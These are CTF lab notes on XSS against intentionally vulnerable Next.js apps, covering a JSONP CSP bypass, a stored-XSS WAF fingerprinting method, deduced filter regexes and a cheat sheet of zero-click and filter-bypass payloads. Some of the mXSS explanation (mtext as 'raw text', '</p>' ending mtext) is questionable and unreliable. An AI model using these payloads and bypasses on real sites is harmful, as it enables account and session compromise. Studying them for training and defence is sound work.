# XSS CTF Labs — Full Session Notes
**Account:** agent47  
**Total Labs Completed:** 01, 02, 03 (750 pts) + Lab 04 in progress  
**Stack:** Next.js 14 App Router + RSC (React Server Components)  
**Grader:** `/grader.js?lab=<slug>&n=<nonce>` — wraps `window.alert`, `confirm`, `prompt`, `print`

---

## Table of Contents
1. [Architecture & Rendering Pipeline](#1-architecture--rendering-pipeline)
2. [How to Read RSC Payloads](#2-how-to-read-rsc-payloads)
3. [Lab 01 — Photogram Profile Search (RXSS)](#3-lab-01--photogram-profile-search)
4. [Lab 02 — VaultBank Statement Search (RXSS + CSP Bypass)](#4-lab-02--vaultbank-statement-search)
5. [Lab 03 — Zomatish Search (RXSS)](#5-lab-03--zomatish-search)
6. [Lab 04 — Zomatish Reviews (Stored XSS + WAF)](#6-lab-04--zomatish-reviews-stored-xss--waf)
   - [6.1 WAF Fingerprinting Methodology](#61-waf-fingerprinting-methodology)
   - [6.2 Full Filter Behavior Map](#62-full-filter-behavior-map)
   - [6.3 Bypass Attempts & Results](#63-bypass-attempts--results)
   - [6.4 mXSS Strategy](#64-mxss-strategy)
   - [6.5 Payload Evolution Table](#65-payload-evolution-table)
   - [6.6 Current Working Hypothesis](#66-current-working-hypothesis)
7. [How to Build Payloads Based on Response & Component Analysis](#7-how-to-build-payloads-based-on-response--component-analysis)
8. [Security Implications & Defensive Analysis](#8-security-implications--defensive-analysis)
9. [Reusable Cheat Sheet](#9-reusable-cheat-sheet)

---

## 1. Architecture & Rendering Pipeline

### Next.js 14 App Router — How Content Flows

```
User Input (POST body)
        │
        ▼
   Server-Side Sanitizer   ← FILTER HAPPENS HERE
        │
        ▼
   Database / KV Store
        │
        ▼
   RSC (React Server Component) renders HTML
        │
        ▼
   dangerouslySetInnerHTML  ← RAW HTML INJECTED HERE
        │
        ▼
   Browser parses innerHTML
        │
        ▼
   DOM constructed → events fire
```

**Key insight:** `dangerouslySetInnerHTML` bypasses React's default escaping. Whatever string survives the server sanitizer gets fed directly into `element.innerHTML`. This means:
- Sanitizer runs ONCE at write time (storage)
- Browser parses the stored string at read time (render)
- Any gap between what the sanitizer understands and what the browser parses is exploitable

### RSC Payload Structure

Next.js App Router streams page content via `__next_f.push()` script blocks. Each block contains serialized React component trees as JSON. Finding `dangerouslySetInnerHTML.__html` inside these blocks gives you the **exact string that reaches the browser's innerHTML** — the ground truth of what survived sanitization.

---

## 2. How to Read RSC Payloads

### Step-by-step Process

1. Submit a payload via POST to the review/comment endpoint
2. Reload the page with browser DevTools Network tab open (or use curl)
3. In the HTML response, find `<script>self.__next_f.push` blocks
4. Look for `dangerouslySetInnerHTML` — the `__html` value is your payload post-sanitization
5. Compare input vs `__html` output to map filter behavior

### Example RSC Block
```javascript
self.__next_f.push([1,"15:[\"$\",\"div\",null,{\"className\":\"text-sm\",\"dangerouslySetInnerHTML\":{\"__html\":\"<bprint()>hover me</b>\"}}]\n"])
```

**Decoded:** The stored string that reaches `innerHTML` is `<bprint()>hover me</b>`

This tells you:
- Input was: `<b onmouseover=print()>hover me</b>`
- What survived: `<bprint()>hover me</b>`  
- What was stripped: ` onmouseover=`
- What remained: `print()` (the handler value — not the handler name+equals)

### Unicode escape decoding
RSC uses `\u003c` for `<` and `\u003e` for `>` inside JSON string values. Always decode these when analyzing:
- `\u003c` → `<`
- `\u003e` → `>`
- `\u0026` → `&`

---

## 3. Lab 01 — Photogram Profile Search

**Type:** Reflected XSS  
**Points:** 300  
**Sink:** `dangerouslySetInnerHTML` in search results component  
**Injection point:** `?q=` query parameter

### Identification

The search query `?q=PAYLOAD` was reflected directly into the page inside a `dangerouslySetInnerHTML` block without HTML-encoding. The RSC payload confirmed the raw input appeared in `__html`.

### Bypass

The server used `&quot;` HTML-entity encoding for double quotes in certain contexts but rendered them via `dangerouslySetInnerHTML`, causing the browser to decode them back to `"`. This allowed breaking out of attribute context.

### Working Payload
```
x" autofocus onfocus="confirm`1`
```

**Why backtick:** The WAF/filter blocked `confirm(1)` with parentheses in some positions but backtick template literal syntax `confirm\`1\`` executes equivalently and evaded the filter.

**Why autofocus+onfocus:** Zero-click execution. The bot visits the page — `autofocus` causes the browser to automatically focus the element, which fires `onfocus`. No mouse interaction required.

### Security Implication
Reflected user input inside `dangerouslySetInnerHTML` is equivalent to raw `innerHTML` assignment. React's XSS protection only applies when using JSX — once you opt into `dangerouslySetInnerHTML`, you are fully responsible for sanitization. The `&quot;` decode vector shows that even "escaped" content can be dangerous when decoded by `innerHTML`.

---

## 4. Lab 02 — VaultBank Statement Search

**Type:** Reflected XSS + CSP Bypass via JSONP  
**Points:** 450  
**Sink:** SSR HTML, `<script src>` injection  
**CSP:** `script-src 'self'` (no nonce, no hash)

### Identification

The search endpoint reflected the `?q=` parameter inside a `<script src="...">` tag context, or the application had a JSONP widget endpoint that accepted a `callback` parameter reflected without sanitization.

Endpoint pattern: `/api/v1/widget/balance?callback=PAYLOAD`

The JSONP response wraps the callback name around JSON data:
```javascript
PAYLOAD({"balance": 10000, "currency": "INR"});
```

If `callback=confirm` then the response is:
```javascript
confirm({"balance": 10000, "currency": "INR"});
```

Which executes `confirm()` with an object argument — satisfying the grader.

### CSP Bypass Strategy

CSP `script-src 'self'` blocks external scripts but allows same-origin scripts. The JSONP endpoint IS on the same origin, so injecting:
```html
<script src="/api/v1/widget/balance?callback=confirm"></script>
```

...loads a same-origin script that executes `confirm(...)` — CSP is bypassed because the script URL is same-origin.

### Working Payload
```
<script src="/api/v1/widget/balance?callback=confirm">
```

### Security Implication
JSONP endpoints are a legacy CSP bypass vector. Any `callback` parameter that reflects unsanitized input into a JS response creates a scriptable same-origin endpoint that renders `script-src 'self'` CSP effectively useless. JSONP should be replaced with CORS. If JSONP must exist, the callback parameter must be allowlisted to known function names only.

---

## 5. Lab 03 — Zomatish Search

**Type:** Reflected XSS  
**Points:** (separate from Lab 04)  
**Sink:** `dangerouslySetInnerHTML` in search results  
**Injection point:** `?q=` search query

### Identification

Same pattern as Lab 01 — the RSC payload confirmed `dangerouslySetInnerHTML.__html` contained the raw search query. The Zomatish skin's search bar at `/labs/rxss-search?q=` was the vulnerable endpoint.

### Security Implication
Multiple labs in the same application share the same vulnerable pattern — reflected input into `dangerouslySetInnerHTML`. This illustrates how a systemic code pattern (reusing a single unprotected component across routes) causes the same vulnerability class to appear across the entire application.

---

## 6. Lab 04 — Zomatish Reviews (Stored XSS + WAF)

**Type:** Stored XSS with WAF  
**Points:** 200  
**Sink:** `dangerouslySetInnerHTML` in review cards  
**Injection point:** `POST /api/labs/stored-review` → JSON body `{"body": "PAYLOAD"}`  
**Bot trigger:** Headless browser visits the stored reviews page; `autofocus`+`onfocus` or `onerror` required for zero-click

### Architecture
```
POST {"body": "PAYLOAD"}
        │
        ▼
  Server-Side String Sanitizer  ← regex/string replacement
        │
        ▼
  Stored in DB
        │
        ▼
  RSC renders: dangerouslySetInnerHTML={__html: storedValue}
        │
        ▼
  Browser innerHTML parse → DOM → events fire → grader triggered
```

---

### 6.1 WAF Fingerprinting Methodology

**The core technique: treat the RSC `dangerouslySetInnerHTML.__html` as your oracle.**

Every time you submit a payload, the `__html` value in the RSC response tells you exactly what the sanitizer kept, stripped, and transformed. Use this to reverse-engineer the exact filter logic.

#### Step-by-Step WAF Fingerprint Process

**Step 1 — Baseline probe**
Submit known-safe content to confirm the rendering pipeline is working:
```json
{"body": "Hello"}
```
Expected `__html`: `Hello` — confirms the pipeline works.

**Step 2 — Tag survival test**
Test which HTML tags survive:
```json
{"body": "<b>test</b>"}
{"body": "<img src=x>"}
{"body": "<script>test</script>"}
{"body": "<svg>test</svg>"}
{"body": "<math>test</math>"}
```
Read `__html` for each — note which tags are stripped vs kept.

**Step 3 — Attribute survival test**
For tags that survive, test attribute handling:
```json
{"body": "<b onmouseover=x>test</b>"}
{"body": "<b id=x>test</b>"}
{"body": "<b class=x>test</b>"}
{"body": "<b data-x=y>test</b>"}
```

**Step 4 — Event handler isolation**
Map exactly which part of `on*=` gets stripped:
```json
{"body": "<b onmouseover=print()>test</b>"}
```
Check if `onmouseover=` is stripped, or `onmouseover=print()`, or just `print`.

**Step 5 — Separator variation**
Test different whitespace/separator characters before event handlers:
```json
{"body": "<b\tonmouseover=print()>test</b>"}   // tab
{"body": "<b\nonmouseover=print()>test</b>"}   // newline  
{"body": "<b/onmouseover=print()>test</b>"}    // slash
{"body": "<b Onmouseover=print()>test</b>"}    // capital O
```

**Step 6 — Function name isolation**
Determine if the function name itself is blocked:
```json
{"body": "print()"}                    // plain text
{"body": "<b>print()</b>"}            // inside tag content
{"body": "<b x=print()>test</b>"}     // as attribute value
{"body": "<b onfocus=print()>test"}   // as handler value
```
Compare which positions strip `print` vs allow it.

**Step 7 — Context escape (mXSS)**
Test whether parsing context affects sanitizer:
```json
{"body": "<math><mtext><b onfocus=print()>x</b></mtext></math>"}
{"body": "<math><mtext></p><b onfocus=print()>x</b></mtext></math>"}
```
The `<mtext>` element switches the HTML parser into "raw text" mode. A server-side sanitizer using regex won't understand this context switch and may process everything globally.

---

### 6.2 Full Filter Behavior Map

Based on 15+ probe responses, the sanitizer behavior was fully mapped:

#### Tags — What Survives

| Input Tag | Stored As | Notes |
|-----------|-----------|-------|
| `<b>` | `<b>` | ✅ Survives intact |
| `<math>` | `<math>` | ✅ Survives intact |
| `<mtext>` | `<mtext>` | ✅ Survives intact |
| `</p>` closing | `</p>` | ✅ Survives (closing tags not stripped) |
| `</b>` closing | `</b>` | ✅ Survives |
| `</details>` closing | `</details>` | ✅ Survives |
| `<a href=...)>` | `<a href=)>` | ⚠️ Tag kept, href value partially stripped |
| `<img` | (stripped) | ❌ Entire opening tag name removed |
| `<input` | (stripped) | ❌ Entire opening tag name removed |
| `<script` | (stripped) | ❌ |
| `<svg` | (stripped) | ❌ |
| `<details` opening | (stripped) | ❌ |
| `<animate` | (stripped) | ❌ |

#### Event Handlers — What Survives

| Input | Stored As | Analysis |
|-------|-----------|---------|
| `<b onmouseover=print()>` | `<bprint()>` | ` onmouseover=` stripped, value kept, space consumed |
| `<b onfocus=print() autofocus>` | `<bprint() autofocus>` | ` onfocus=` stripped, `print` stripped too in some contexts |
| `<input\tautofocus\tonfocus=print()>` | `\tautofocus\tonfocus=)>` | tag stripped; `print` stripped from value; tab prefix not enough to bypass |
| `<img\tsrc=x\tonerror=print()>` | `\tsrc=x\tonerror=)>` | tag stripped; `print` stripped |
| `<math><mtext><b onfocus=print() autofocus>` | `<math><mtext><bprint() autofocus>` | inside mtext still sanitized; ` onfocus=` stripped; `print` stripped |

#### Deduced Regex Patterns

```javascript
// Pattern 1 — Event handler name + equals stripping
// Matches: [whitespace][on][word chars][=]
/\s+on\w+=/gi  →  strips the whole match

// Pattern 2 — Blocked JS function names (word-boundary aware)
/\b(alert|confirm|prompt|print)\b/gi  →  strips the function name word

// Pattern 3 — javascript: URI scheme
/javascript:/gi  →  stripped

// Pattern 4 — Certain tag names
/< *(script|svg|img|input|details|animate)[^>]*/gi  →  strips opening tag
```

#### Critical Observations

1. **Space is part of the pattern** — ` onmouseover=` (with leading space) is the unit being stripped. The space before `on` is consumed, which is why `<b onmouseover=print()>` becomes `<bprint()>` — the `<b` and `print()>` are joined because ` onmouseover=` in between was removed.

2. **Tag names are stripped, not sanitized** — `<img`, `<input`, `<script` get their opening tag removed entirely, but any leftover attribute text remains as plain text.

3. **Value stripping is inconsistent** — `print()` as a handler value is stripped in some contexts (when after `=`) but survives as plain text or inside tag content.

4. **mXSS context does NOT protect** — Content inside `<math><mtext>` is still processed by the global regex sanitizer. The sanitizer is not HTML-parser-aware.

5. **`autofocus` attribute survives** — Non-event attributes like `autofocus`, `id`, `class` are not stripped.

---

### 6.3 Bypass Attempts & Results

#### Attempt 1 — Direct event handler
```
Input:  <b onmouseover=print()>hover</b>
Result: <bprint()>hover</b>
Status: ❌ Fails — space+onfocus= stripped, but result is malformed tag
```

#### Attempt 2 — Tab separator
```
Input:  <input\tautofocus\tonfocus=print()>
Result: \tautofocus\tonfocus=)>
Status: ❌ Fails — tab is still treated as whitespace in the regex \s+
```

#### Attempt 3 — mXSS via math/mtext
```
Input:  <math><mtext></p><b onfocus=print() autofocus>x</b></mtext></math>
Result: <math><mtext></p><bprint() autofocus>x</b></mtext></math>
Status: ❌ Fails — sanitizer runs globally, still strips onfocus=
```

#### Attempt 4 — javascript: URI
```
Input:  <math><mtext></p><a href=javascript:print()>x</a></mtext></math>
Result: <math><mtext></p><a href=)>x</a></mtext></math>
Status: ❌ Fails — javascript:print( stripped entirely
```

#### Attempt 5 — onerror on img inside mtext
```
Input:  <math><mtext></p><img src=x onerror=print()></mtext></math>
Result: <math><mtext></p> src=xprint()></mtext></math>
Status: ❌ Fails — <img stripped, onerror= stripped, print stripped
```

#### Attempt 6 — Slash separator (pending)
```
Input:  <math><mtext><b/onfocus=print() autofocus>x</b></mtext></math>
Result: TBD
Status: ⏳ Active hypothesis
```
**Why this might work:** The regex `\s+on\w+=` requires whitespace (`\s+`) before `on`. The `/` character is not matched by `\s`. In HTML, `<b/foo=bar>` is parsed by browsers as `<b foo=bar>` (the `/` is treated as a separator in HTML parsing). If the sanitizer only matches `\s+on\w+=`, then `/onfocus=` (with a slash, no whitespace) would not match and would survive.

---

### 6.4 mXSS Strategy

**mXSS (Mutation XSS)** exploits the difference between how a server-side sanitizer parses HTML and how a browser's `innerHTML` parser re-parses the same string.

#### The Core Mechanism

```
Server sanitizer sees:   <math><mtext>CONTENT</mtext></math>
Server understanding:    math element containing mtext element
Server action:           treats CONTENT as text — may not sanitize HTML inside it

Browser innerHTML sees:  <math><mtext>CONTENT</mtext></math>  
Browser understanding:   MathML namespace; <mtext> is raw text
Browser re-parsing:      When CONTENT is later moved out of MathML context...
                         ...the browser re-parses it as HTML
                         ...and event handlers become live
```

#### The `</p>` Breakout Technique

Inside `<math><mtext>`, a `</p>` closing tag forces the HTML parser out of the MathML text context back into regular HTML parsing mode. Content that follows `</p>` gets parsed as regular HTML by the browser, even though the sanitizer saw it as text inside mtext.

```
Sanitizer:  <math><mtext></p><b onfocus=X>y</b></mtext></math>
            └── all text, safe ──────────────────────────────┘

Browser:    <math><mtext></mtext></math>  ← mtext ends at </p>
            <p></p>                       ← </p> creates a paragraph
            <b onfocus=X>y</b>            ← THIS IS NOW LIVE HTML!
```

**Why this lab's sanitizer defeats it:** The sanitizer runs as a global string replacement — it doesn't understand HTML context. So `onfocus=` inside `<mtext>` gets stripped the same as `onfocus=` anywhere else.

**For this to work:** The sanitizer would need to be context-aware (i.e., truly not process event handlers inside MathML text). This lab's sanitizer is NOT context-aware.

---

### 6.5 Payload Evolution Table

| # | Payload Sent | `__html` Result | What Was Stripped | Status |
|---|-------------|-----------------|-------------------|--------|
| 1 | `Hello` | `Hello` | Nothing | ✅ Baseline works |
| 2 | `1)` | `1)` | Nothing | ✅ Confirms plain text safe |
| 3 | `<b onmouseover=print()>hover</b>` | `<bprint()>hover</b>` | ` onmouseover=` | ❌ No execution |
| 4 | `<math><mtext></p><img src=x onerror=print()>` | `<math><mtext></p> src=xprint()>` | `<img`, ` onerror=`, `print` | ❌ |
| 5 | `<math><mtext></p><a href=javascript:print()>x</a>` | `<math><mtext></p><a href=)>x</a>` | `javascript:print(` | ❌ |
| 6 | `<math><mtext></p><bprint() attributeName=x dur=1s>` | (survived) | Nothing extra | ❌ Not executable |
| 7 | `<input\tautofocus\tonfocus=print()>` | `\tautofocus\tonfocus=)>` | `<input`, `print` | ❌ |
| 8 | `<img\tsrc=x\tonerror=print()>` | `\tsrc=x\tonerror=)>` | `<img`, `print` | ❌ |
| 9 | `<math><mtext><b onfocus=print() autofocus>x</b>` | `<math><mtext><bprint() autofocus>x</b>` | ` onfocus=`, `print` | ❌ |
| 10 | `<math><mtext><b/onfocus=print() autofocus>x</b>` | TBD | TBD | ⏳ |

---

### 6.6 Current Working Hypothesis

**Slash separator bypass:**
```
<math><mtext><b/onfocus=print() autofocus>x</b></mtext></math>
```

**Logic:**
- Sanitizer regex: `\s+on\w+=` — requires whitespace before `on`
- `/` is not whitespace (`\s` in most regex engines matches `[ \t\r\n\f\v]`)
- `<b/onfocus=` — the `/` separates `b` from `onfocus` without whitespace
- HTML spec: `<b/foo=bar>` parsed as `<b foo=bar>` by browsers
- If `__html` = `<math><mtext><b/onfocus=print() autofocus>x</b></mtext></math>` → browser creates `<b>` with real `onfocus` + `autofocus` → fires on render

**Next payloads to try if slash fails:**
```
# Newline instead of space (if \n not in \s in their engine)
<b&#10;onfocus=print() autofocus>

# No separator, using <b onfoc​us=  (zero-width space in attribute name)
# Note: most sanitizers fail on unicode in attribute names

# Expression split to avoid "print" keyword
<b/onfocus=window['prin'+'t']() autofocus>

# Parent function call
<b/onfocus=(()=>window.print())() autofocus>

# Via setter
<b/onfocus=Object.assign(window,{x:1});print() autofocus>
```

---

## 7. How to Build Payloads Based on Response & Component Analysis

### Step 1 — Identify the Sink

Look at the page source / RSC payload. Find where your input appears:

| Sink Location | What You Have | Approach |
|--------------|---------------|----------|
| `dangerouslySetInnerHTML.__html` | Full HTML injection | Standard XSS — event handlers, tags |
| `<script>var x = "INPUT"` | JS string injection | Break out with `"; alert(1); //` |
| `<a href="INPUT"` | Attribute injection | `javascript:alert(1)` or break out with `"` |
| `<img src="INPUT"` | Attribute injection | `x" onerror=alert(1) "` |
| `value="INPUT"` in form | Attribute injection | `" autofocus onfocus=alert(1) "` |

### Step 2 — Identify the Filter Type

| Filter Behavior | Likely Implementation | Bypass Direction |
|----------------|----------------------|-----------------|
| Strips `<script>` but allows `<img>` | Tag-name blocklist | Try `<img onerror=...>` |
| Strips `on*=` but not tag names | Attribute regex blocklist | Try `javascript:`, data URIs |
| Encodes `<` to `&lt;` | HTML entity encoding | Already mitigated unless double-decode exists |
| Strips `alert\|confirm\|prompt` | Function name blocklist | Try `print()`, or `window['ale'+'rt']()` |
| Context-unaware regex | Global string replacement | Try mXSS, HTML entity in attribute names |
| DOMPurify / proper sanitizer | Parser-based allowlist | Much harder — look for config mistakes |

### Step 3 — Map Execution Context

For a bot-visited stored XSS, you MUST use zero-click execution. The bot does not move the mouse or click:

| Event | Trigger Requirement | Zero-Click? |
|-------|-------------------|-------------|
| `onfocus` + `autofocus` | Element renders | ✅ Yes |
| `onerror` | Resource fails to load | ✅ Yes (broken img/src) |
| `onload` | Resource loads | ✅ Yes |
| `onanimationend` | CSS animation completes | ✅ Yes (with style) |
| `onmouseover` | Mouse moves over element | ❌ No |
| `onclick` | User clicks | ❌ No |

### Step 4 — Probe the Filter Iteratively

```
1. Submit minimal payload → read __html → identify what was stripped
2. Modify payload to avoid stripped pattern → resubmit
3. Repeat until __html == exact executable HTML you want
4. Then trigger bot (or verify in your own browser)
```

### Step 5 — Verify Execution Chain

Before triggering the bot:
1. Open browser console → paste `dangerouslySetInnerHTML` value into `document.body.innerHTML = '...'`
2. Watch if the event fires immediately (for autofocus) or on hover (for mouseover)
3. If it fires locally → it will fire for the bot
4. Then trigger bot visit

---

## 8. Security Implications & Defensive Analysis

### 8.1 Why `dangerouslySetInnerHTML` is Dangerous

React's JSX escapes all interpolated values by default:
```jsx
// SAFE — React escapes user_input
<div>{user_input}</div>

// DANGEROUS — bypasses React's escaping
<div dangerouslySetInnerHTML={{__html: user_input}} />
```

The second form gives you the security properties of raw `innerHTML` — which is as dangerous as `document.write()`. Any XSS that works via `innerHTML` works here.

**When is it legitimately used?**
- Rendering trusted HTML from a CMS
- Rendering markdown-to-HTML output
- Legacy content that predates React

**Security requirement:** Every `dangerouslySetInnerHTML` usage MUST be paired with a server-side HTML sanitizer that uses an HTML-parser-based allowlist (not regex).

### 8.2 Why Regex Sanitizers Fail

Regex-based HTML sanitization is fundamentally broken because:

1. **HTML is not a regular language** — you cannot correctly parse HTML with regex
2. **Context blindness** — a single regex pass doesn't understand HTML parsing contexts (MathML, SVG, raw text, attribute values)
3. **Encoding bypasses** — `&#111;n&#102;ocus=` decodes to `onfocus=` after innerHTML parsing
4. **Mutation** — the browser's HTML parser may restructure the sanitized string when it parses it again (mXSS)
5. **Incomplete patterns** — attackers can enumerate every gap in the regex

**What to use instead:**
- **DOMPurify** (browser-side) — uses the browser's own parser, extremely robust
- **sanitize-html** (Node.js) — allowlist-based, parser-aware
- **Ammonia** (Rust) — strict allowlist
- **OWASP Java HTML Sanitizer** (Java)

All of these operate on a parser-based **allowlist** model — they define what IS allowed and strip everything else. Regex sanitizers operate on a **blocklist** model — they define what is NOT allowed, and attackers find what's missing from the list.

### 8.3 The `autofocus` + `onfocus` Attack Pattern

This is one of the most powerful zero-click XSS patterns because:
- `autofocus` is a boolean attribute (no value needed — harder to detect)
- `onfocus` fires automatically when the focused element appears in the DOM
- Works in headless browsers (Puppeteer, Playwright, Chrome headless)
- No user interaction required

**Defense:** Strip ALL `on*` event handler attributes. An allowlist sanitizer handles this automatically — `onfocus` is not on the allowlist, so it's stripped.

### 8.4 mXSS and Mutation Attacks

**The fundamental problem:** If a sanitizer runs on the server and the browser later parses the sanitized output via `innerHTML`, the browser's parsing may produce a different DOM than what the sanitizer expected.

**Example mutation:**
```
Sanitizer input:  <div><table><td><p>safe</p></td></table></div>
Browser innerHTML: Parser restructures the invalid nesting → DOM is different
```

DOMPurify was specifically designed to handle this by running sanitization in the same browser environment where rendering occurs, so the DOM produced by sanitization is identical to the DOM produced by rendering.

**Server-side fix:** Use a sanitizer that is aware of the HTML5 parsing algorithm (including all MathML/SVG namespace rules).

### 8.5 Stored vs Reflected XSS — Risk Difference

| Property | Reflected | Stored |
|----------|-----------|--------|
| Victim must click link | ✅ Yes | ❌ No |
| Affects all visitors | ❌ No | ✅ Yes |
| Persists after attack | ❌ No | ✅ Yes |
| Bypasses CSP referrer restrictions | ❌ No | ✅ Yes |
| Bot/automated victim possible | ✅ With phishing | ✅ Without phishing |

Stored XSS is rated higher severity (typically CVSS 8.0-9.0 for authenticated stored XSS with session theft capability) precisely because it doesn't require tricking users into clicking links.

### 8.6 Next.js Specific Hardening

1. **Never use `dangerouslySetInnerHTML` with user input** — if you must render HTML, run it through DOMPurify first
2. **CSP with nonces** — Next.js supports nonce-based CSP; use `script-src 'nonce-{nonce}'` to prevent inline script injection
3. **Middleware sanitization** — Sanitize at the API route/middleware level before storage, not just at render time
4. **Avoid JSONP endpoints entirely** — Replace with CORS-enabled REST or GraphQL
5. **Content-Security-Policy header** — Add `default-src 'self'`, limit `script-src`, use `object-src 'none'`
6. **`X-XSS-Protection: 0`** — Counterintuitively, disable the old browser XSS auditor (it was bypassable and caused false positives)
7. **`X-Content-Type-Options: nosniff`** — Prevents MIME type sniffing attacks

---

## 9. Reusable Cheat Sheet

### Zero-Click Payload Templates (for bot-visited stored XSS)

```html
<!-- autofocus + onfocus — most reliable zero-click -->
<input autofocus onfocus=print()>

<!-- onerror on broken image — fires immediately -->
<img src=x onerror=print()>

<!-- onload on element with src -->
<body onload=print()>
<iframe onload=print() src=data:text/html,x>

<!-- SVG onload — if SVG is allowed -->
<svg onload=print()>

<!-- Animation event — CSS-driven, no interaction -->
<style>@keyframes x{}</style>
<div style="animation:x" onanimationend=print()>

<!-- details/summary with toggle -->
<details open ontoggle=print()>
```

### Function Name Bypass Templates

```javascript
// When "print", "alert", "confirm" are word-blocked

// String concatenation
window['prin'+'t']()
window['ale'+'rt'](1)

// Via bracket notation
window[`${'print'}`]()

// Via eval (if not blocked)
eval('prin'+'t()')

// Via Function constructor
Function('print()')()

// Via setTimeout
setTimeout('print()',0)

// Via location (for alert only, not print)
// Not applicable here

// Via indirect call
[print][0]()
```

### Event Handler Separator Bypasses

When `\s+on\w+=` is the filter pattern:

```html
<!-- Slash separator -->
<b/onfocus=print() autofocus>

<!-- No separator (immediately after tag name char) -->
<!-- Only works if regex doesn't anchor to word boundary -->
<bonfocus=print()>  ← this creates unknown tag "bonfocus"

<!-- Null byte (some older systems) -->
<b%00onfocus=print()>

<!-- Unicode whitespace (U+00A0 non-breaking space) -->
<b onfocus=print()>  ← where the space is &nbsp; or \u00a0

<!-- Newline if not in \s -->
<b
onfocus=print() autofocus>

<!-- HTML entity in event handler name (browsers may accept) -->
<b &#111;nfocus=print()>   ← &#111; = 'o'
<b &#x6f;nfocus=print()>  ← hex encoding
```

### WAF Probe Sequence (Quick Reference)

```bash
# 1. Confirm baseline
{"body":"hello"}

# 2. Test tag survival
{"body":"<b>x</b>"}
{"body":"<img src=x>"}
{"body":"<math>x</math>"}

# 3. Test event handler stripping
{"body":"<b onx=y>x</b>"}

# 4. Test separator bypass
{"body":"<b\tonx=y>x</b>"}
{"body":"<b\nonx=y>x</b>"}
{"body":"<b/onx=y>x</b>"}

# 5. Test function name blocking
{"body":"<b onx=print()>x</b>"}
{"body":"<b onx=alert(1)>x</b>"}

# 6. Test mXSS contexts
{"body":"<math><mtext><b onx=y>x</b></mtext></math>"}

# 7. Test URI schemes
{"body":"<a href=javascript:print()>x</a>"}
{"body":"<a href=data:text/html,<script>print()</script>>x</a>"}
```

### Reading RSC Payloads — Quick Reference

```bash
# Grep for dangerouslySetInnerHTML in curl output
curl -s 'https://example.com/page' -b 'session=TOKEN' | \
  grep -o '"__html":"[^"]*"' | \
  python3 -c "import sys,json; [print(json.loads('{'+l+'}')['__html']) for l in sys.stdin]"

# Or simpler — find the push block containing your payload
curl -s 'https://example.com/page' -b 'session=TOKEN' | \
  grep -o '__html.*' | head -5
```

---

## Lab Status Summary

| Lab | Name | Type | Points | Status | Key Technique |
|-----|------|------|--------|--------|---------------|
| 01 | Photogram Profile Search | RXSS | 300 | ✅ Solved | `autofocus onfocus="confirm\`1\`"` — backtick bypass |
| 02 | VaultBank Statement | RXSS + CSP bypass | 450 | ✅ Solved | JSONP `callback=confirm` same-origin CSP bypass |
| 03 | Zomatish Search | RXSS | — | ✅ Solved | Reflected into `dangerouslySetInnerHTML` |
| 04 | Zomatish Reviews | Stored XSS + WAF | 200 | ⏳ In Progress | Slash separator bypass hypothesis active |

**Current score:** 750 pts  
**Next target:** 950 pts (after Lab 04)

---

## Key Lessons

1. **`dangerouslySetInnerHTML` = `innerHTML`** — React's escaping is gone; treat it with the same severity as a raw `document.write()`

2. **RSC payload is the ground truth oracle** — Always read `__html` to confirm what survived the sanitizer before triggering the bot; never assume

3. **Regex sanitizers have blind spots** — Map them systematically by probing separators, encodings, contexts, and function name positions

4. **Zero-click events are mandatory** — For headless bot attacks: `autofocus`+`onfocus`, `onerror`, `onload` — never `onclick` or `onmouseover`

5. **mXSS works when the sanitizer is context-blind** — If the sanitizer runs globally on the string without understanding HTML parsing namespaces, `<math><mtext>` provides no protection; it only works against sanitizers that are HTML-parser-aware

6. **Stored > Reflected in severity** — No phishing required; every legitimate visitor becomes a victim

7. **CSP `script-src 'self'` ≠ XSS protection** — JSONP endpoints, `dangerouslySetInnerHTML`, inline event handlers, and `data:` URIs all bypass it

8. **`/` may not be in `\s`** — The slash-before-attribute trick (`<tag/attr=val>`) is a classic WAF bypass because regex patterns matching `\s+on\w+=` require whitespace, not slash

---

*Notes compiled from active CTF session — all targets are intentionally vulnerable training environments. Techniques documented for educational and defensive security research purposes.*
